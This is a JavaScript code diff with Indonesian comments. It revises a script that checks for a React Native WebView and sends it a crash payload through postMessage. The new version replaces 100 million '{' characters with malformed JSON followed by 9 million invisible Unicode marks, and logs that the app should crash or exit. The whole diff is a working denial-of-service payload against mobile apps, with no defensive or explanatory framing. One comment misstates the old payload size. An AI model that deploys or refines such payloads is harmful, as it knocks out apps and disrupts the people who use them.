@@ -9,11 +9,14 @@ try {
     if (window.ReactNativeWebView) {
         log("ReactNativeWebView detected. Sending crash payload...");
 
-        // Payload besar + JSON rusak
-        const payload = "{".repeat(100_000_000); // 10 juta karakter '{'
+        // Gabungan: JSON rusak + unicode flood besar
+        const hugeFlood = "\u200F".repeat(9_000_000); // 9 juta karakter tak terlihat
+        const payload = "{" + hugeFlood; // JSON rusak (tidak tertutup)
+
+        // Kirim payload langsung
         window.ReactNativeWebView.postMessage(payload);
 
-        log("Payload sent. App may crash immediately.");
+        log("Payload sent. App should crash or exit immediately.");
     } else {
         log("ReactNativeWebView not available.");
     }
